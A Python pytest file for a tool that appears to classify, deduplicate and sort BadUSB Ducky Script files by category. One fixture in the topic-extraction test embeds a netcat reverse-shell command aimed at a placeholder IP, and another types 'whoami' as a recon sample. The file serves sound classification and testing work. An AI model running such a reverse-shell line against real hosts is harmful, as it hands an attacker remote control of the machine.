import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Bad_USB_Classifier import classify_badusb as cb


def test_is_ducky_script_valid():
    content = "REM comment\nDELAY 500\nSTRING hello\nENTER\n"
    assert cb.is_ducky_script(content) is True


def test_is_ducky_script_invalid():
    assert cb.is_ducky_script("just some random text\nnothing here\n") is False


def test_extract_topic_from_content_matches_known_topic():
    content = "REM Category: ReverseShell\nSTRING nc -e /bin/sh 1.2.3.4 4444\n"
    assert cb.extract_topic_from_content(content) == "ReverseShell"


def test_extract_topic_from_content_no_match():
    assert cb.extract_topic_from_content("STRING hello world\n") is None


def test_dedup_index_detects_exact_duplicate():
    dedup = cb.DedupIndex()
    content = "REM same\nSTRING hi\n"
    assert dedup.is_duplicate(content) is False
    assert dedup.is_duplicate(content) is True


def test_run_classifier_no_ollama_sorts_files(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    (src / "a.txt").write_text("REM Category: prank\nSTRING harmless\nENTER\n")
    (src / "b.txt").write_text("not a ducky script at all\n")

    out = cb.run_classifier(src, output_root=tmp_path / "out", use_ollama=False)

    assert (out / "prank" / "a.txt").is_file()
    assert not (out / "prank" / "b.txt").exists()
    assert (out / "classification.log").is_file()


def test_run_classifier_dedups_identical_files(tmp_path):
    src = tmp_path / "src"
    src.mkdir()
    content = "REM Category: recon\nSTRING whoami\nENTER\n"
    (src / "a.txt").write_text(content)
    (src / "a_copy.txt").write_text(content)

    out = cb.run_classifier(src, output_root=tmp_path / "out", use_ollama=False)

    recon_files = list((out / "recon").glob("*.txt"))
    assert len(recon_files) == 1
